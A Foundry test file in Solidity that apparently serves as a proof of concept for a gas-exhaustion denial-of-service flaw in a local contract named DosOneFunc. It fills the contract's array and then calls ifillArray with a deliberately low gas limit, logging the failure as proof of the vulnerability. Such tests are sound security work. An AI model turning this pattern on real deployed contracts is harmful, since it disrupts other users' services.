// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/dos_simple.sol";

contract DosSimpleTest is Test {
    DosOneFunc public dosContract;
    address public tester = address(0x1); // Test account
    
    function setUp() public {
        dosContract = new DosOneFunc(); // Deploy contract
    }

    function testDosVulnerability() public {
        vm.startPrank(tester);
        
        // Fill array to 1400 (4 calls @ 350/call)
        for(uint i = 0; i < 4; i++) {
            dosContract.ifillArray();
        }

        // 5th call: add 350 → total 1750 (>=1500)
        dosContract.ifillArray();

        // 6th call: try resetting large array (1750 elements) with low gas limit
        uint customGasLimit = 10000; // Set inadequate gas
        console.log("--- BEFORE-Trigger ---");
        console.log("Array ready for reset (1750 elements), low gas limit set to 10000");

        console.log("--- Trigger ---");
        console.log("Attempting ifillArray reset with insufficient gas...");
        (bool success, ) = address(dosContract).call{gas: customGasLimit}(
            abi.encodeWithSignature("ifillArray()")
        );
        
        console.log("--- AFTER-Trigger ---");
        console.log("Operation status:", success ? "Succeeded" : "Failed (DoS achieved)");
        vm.stopPrank();

        // Final vulnerability verdict
        if (!success) {
            console.log("Vulnerability Exists: Transaction failed due to gas exhaustion, proving DoS vulnerability");
        } else {
            console.log("Vulnerability not Exist: Transaction succeeded - contract likely fixed");
            fail("Expected operation to fail due to gas exhaustion");
        }
    }
}